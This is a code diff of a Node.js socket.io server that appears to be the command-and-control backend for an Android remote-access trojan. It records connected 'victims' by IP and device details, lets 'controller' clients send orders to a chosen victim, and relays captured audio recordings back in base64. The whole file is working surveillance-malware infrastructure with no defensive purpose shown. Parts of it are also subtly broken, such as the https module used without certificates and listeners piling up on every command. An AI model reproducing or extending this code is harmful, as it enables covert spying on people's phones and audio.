@@ -1,81 +1,139 @@
 const express = require('express');
-const { Server } = require('socket.io');
-const http = require('http');
-const os = require('os');
+const http = require('https');
+const socketIo = require('socket.io');
+
+// A simplified version of the victimsList object from the Electron code.
+const victimsList = {
+    victims: {},
+    addVictim(socket, ip, port, country, manufacturer, model, release, id, connectionUserId) {
+        this.victims[id] = { socket, ip, port, country, manufacturer, model, release, id, connectionUserId };
+        console.log(`Victim added: ${id}`);
+    },
+    getVictim(connectionUserId) {
+        // Convert the object values to an array and find the victim by connectionUserId
+        return Object.values(this.victims).find(victim => victim.connectionUserId === connectionUserId);
+    },    
+    rmVictim(id) {
+        delete this.victims[id];
+        console.log(`Victim removed: ${id}`);
+    }
+};
+
+// Controllers list to track controller connections
+const controllersList = {
+    controllers: {},
+    addController(socket, id, connectionUserId) {
+        this.controllers[id] = { socket, id, connectionUserId };
+        console.log(`Controller added: ${id}`);
+    },
+    getController(id) {
+        return this.controllers[id];
+    },
+    rmController(id) {
+        delete this.controllers[id];
+        console.log(`Controller removed: ${id}`);
+    }
+};
 
 const app = express();
-
-// Create HTTP server
 const server = http.createServer(app);
-
-// Socket.io setup with CORS policy (use environment variable for frontend URL)
-const io = new Server(server, {
+const io = socketIo(server, {
     cors: {
-        origin: process.env.FRONTEND_URL || "*", // Replace with your frontend URL in production
-        methods: ["GET", "POST"],
-        allowedHeaders: ["my-custom-header"],
-        credentials: true,
+        origin: '*', // Adjust to your needs
+        methods: ['GET', 'POST']
     }
 });
 
+const PORT = 42474; // Change the port if needed
 
-
-let victimsList = []; // To keep track of connected clients
-
+// Handle a new connection
 io.on('connection', (socket) => {
-    console.log('New client connected:', socket.id);
+    const address = socket.handshake.address;
+    const query = socket.handshake.query;
+    const index = query.id;
+    const ip = address.split(':').pop(); // Extract IP address
+    const country = null; // Modify as needed
 
-    // Extract query parameters from the connection
-    const model = socket.handshake.query.model;
-    const manufacturer = socket.handshake.query.manf;
-    const release = socket.handshake.query.release;
-    const deviceId = socket.handshake.query.id;
-    const connectionUserId = socket.handshake.query.connectionUserId;
+    console.log(`Client connected: ${socket.id}, IP: ${ip}`);
 
-    // Create a victim object to store connected client info
-    const victim = {
-        id: socket.id,
-        model: model,
-        manufacturer: manufacturer,
-        release: release,
-        deviceId: deviceId,
-        connectionUserId: connectionUserId,
-        ip: socket.handshake.address, // IP address of the client
-    };
+    if (query.type !== 'controller') {
+        // Victim-specific logic
+        victimsList.addVictim(socket, ip, address, country, query.manf, query.model, query.release, query.id, query.connectionUserId);
+        console.log(ip, address, country, query.manf, query.model, query.release, query.id, query.connectionUserId);
 
-    // Add the victim to the list
-    victimsList.push(victim);
-    console.log('Victims List:', victimsList);
+        // Notify the victim it has connected
+        socket.emit('SocketIO:NewVictim', index);
 
-    // Notify all clients about the new victim
-    io.emit('newVictim', victimsList);
+       
+
+        // Notify all clients of the new victim
+        io.emit('SocketIO:NewVictim', index);
+    } else {
+        // Controller-specific logic
+        controllersList.addController(socket, query.id);
+        console.log(`Controller connected: ${query.id}`);
+
+        socket.on('command', (data) => {
+            console.log('Command received from controller:', data);
+        
+            // Here you can forward the command to the victim
+            const victim = victimsList.getVictim(data.userId); // Ensure the controller specifies the victim
+            if (victim) {
+                victim.socket.emit('order', data.command); // Send command to victim
+        
+                // Listen for the result from the victim
+                victim.socket.on('x0000mc', (resultData) => {
+                    console.log('Result received from victim:', resultData);
+                    
+                    if (resultData.file && resultData.buffer) {
+                        // Convert Buffer to base64
+                        const base64Buffer = resultData.buffer.toString('base64');
+                        
+                        // Forward the result to the controller
+                        const audioResponse = {
+                            name: resultData.name,
+                            buffer: base64Buffer,
+                        };
+                        
+                        socket.emit('result', audioResponse);
+                    } else {
+                        console.error('Received data does not contain audio.');
+                    }
+                });
+            } else {
+                console.log(`Victim for Controller ID ${data.userId} not found.`);
+            }
+        });
+        
+
+        // Notify all clients of the new controller if needed
+        io.emit('SocketIO:NewController', query.id);
+    }
 
     // Handle disconnection
     socket.on('disconnect', () => {
         console.log('Client disconnected:', socket.id);
-        victimsList = victimsList.filter(v => v.id !== socket.id);
-        io.emit('victimDisconnected', victimsList);
+
+        if (query.type === 'victim') {
+            victimsList.rmVictim(index);
+            io.emit('SocketIO:RemoveVictim', index); // Notify clients about the removal of the victim
+        } else if (query.type === 'controller') {
+            controllersList.rmController(query.id);
+            io.emit('SocketIO:RemoveController', query.id); // Notify clients about the removal of the controller
+        }
     });
 });
 
-// Function to get the server's IP address
-function getDeviceIp() {
-    const interfaces = os.networkInterfaces();
-    for (const iface of Object.values(interfaces)) {
-        for (const addr of iface) {
-            if (addr.family === 'IPv4' && !addr.internal) {
-                return addr.address; // Return the first non-internal IPv4 address
-            }
-        }
+// Error handling similar to the Electron `uncaughtException` handling
+process.on('uncaughtException', (error) => {
+    if (error.code === "EADDRINUSE") {
+        console.log("Address already in use. Please change the port.");
+    } else {
+        console.error("Uncaught Exception:", error);
     }
-    return '0.0.0.0'; // Fallback if no IP is found
-}
+});
 
 // Start the server
-const PORT = process.env.PORT || 42474;
-const DEVICE_IP = getDeviceIp();
-
-// Change DEVICE_IP to '0.0.0.0' for cloud deployment
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`Socket server is running on http://0.0.0.0:${PORT}`);
+server.listen(PORT, () => {
+    console.log(`Server is running on http://localhost:${PORT}`);
 });
